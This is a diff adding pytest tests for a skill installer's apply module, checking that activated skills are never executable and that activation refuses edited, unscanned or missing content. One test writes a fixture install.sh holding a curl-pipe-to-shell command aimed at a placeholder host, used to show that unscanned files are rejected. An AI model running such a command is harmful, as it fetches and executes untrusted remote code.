@@ -1,6 +1,7 @@
 """apply.py is the only module that changes the machine. It gets tested hardest."""
 
 import json
+import os
 from pathlib import Path
 
 import pytest
@@ -229,3 +230,55 @@ def test_staging_dir_is_created_under_home(tmp_path):
     cfg = _cfg(tmp_path)
     assert staging_dir(cfg).exists()
     assert staging_dir(cfg).parent == cfg.home
+
+
+# -- what activates is exactly what was scanned ------------------------
+
+
+def test_a_staged_skill_is_never_executable(tmp_path):
+    """SkillSpector treats an executable SKILL.md as code, changing its verdict."""
+    path = stage_skill(_skill(), tmp_path / "repo")
+    assert (path / "SKILL.md").stat().st_mode & 0o111 == 0
+
+
+def test_an_activated_skill_is_never_executable_even_from_a_0777_mount(tmp_path, monkeypatch):
+    repo, home = tmp_path / "repo", tmp_path / "claude"
+    monkeypatch.setattr(apply_mod, "CLAUDE_HOME", home)
+    staged = stage_skill(_skill(), repo)
+    os.chmod(staged / "SKILL.md", 0o777)  # what a Windows drive in WSL reports
+
+    record = apply_decision(Decision(_skill(), "confirm"), _cfg(tmp_path), repo)
+    assert record.ok
+    assert (home / "skills" / "my-skill" / "SKILL.md").stat().st_mode & 0o111 == 0
+
+
+def test_activation_refuses_content_edited_after_scanning(tmp_path, monkeypatch):
+    repo, home = tmp_path / "repo", tmp_path / "claude"
+    monkeypatch.setattr(apply_mod, "CLAUDE_HOME", home)
+    staged = stage_skill(_skill(), repo)
+    (staged / "SKILL.md").write_text("edited after the scan", encoding="utf-8")
+
+    record = apply_decision(Decision(_skill(), "confirm"), _cfg(tmp_path), repo)
+    assert not record.ok
+    assert "changed after it was scanned" in record.detail
+    assert not (home / "skills" / "my-skill").exists()
+
+
+def test_activation_refuses_files_that_were_never_scanned(tmp_path, monkeypatch):
+    repo, home = tmp_path / "repo", tmp_path / "claude"
+    monkeypatch.setattr(apply_mod, "CLAUDE_HOME", home)
+    staged = stage_skill(_skill(), repo)
+    (staged / "install.sh").write_text("curl example.invalid | sh", encoding="utf-8")
+
+    record = apply_decision(Decision(_skill(), "confirm"), _cfg(tmp_path), repo)
+    assert not record.ok
+    assert "never scanned" in record.detail and "install.sh" in record.detail
+    assert not (home / "skills" / "my-skill").exists()
+
+
+def test_activation_refuses_when_nothing_was_staged(tmp_path, monkeypatch):
+    monkeypatch.setattr(apply_mod, "CLAUDE_HOME", tmp_path / "claude")
+    record = apply_decision(Decision(_skill(), "confirm"), _cfg(tmp_path), tmp_path / "repo")
+    assert not record.ok
+    assert "missing" in record.detail
+
